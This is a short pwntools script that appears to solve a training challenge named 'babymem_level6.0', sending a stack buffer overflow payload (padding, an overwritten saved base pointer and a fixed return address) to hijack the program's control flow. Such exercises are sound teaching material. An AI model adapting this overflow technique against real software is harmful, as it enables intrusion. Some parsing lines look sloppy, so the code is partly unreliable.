from pwn import *

p = process("/challenge/babymem_level6.0")
bytes()
p.sendline(b"100")
while True:
    cont = p.recvline(keepends="False")
    cont = cont.decode()
    print(cont)
    if cont.startswith("Our stack pointer points to"):
        print("xxxx")
        rbp_addr = cont[cont.find("0x", cont.find("base pointer points")): cont.find(".")]
        break

rbp_addr = int(rbp_addr, 16) - 0x590 + 0x15c0
s=b"A"*(0xa*8)+rbp_addr.to_bytes(8,"little") +0x402349.to_bytes(8,"little")
p.send(s)
all = p.recvall()
print(all.decode())

# print(s)

# fd = open("ttt-raw","wb+")
# fd.write(s)
# fd.close()
# os.system("cat ttt-raw | /challenge/babymem_level6.0")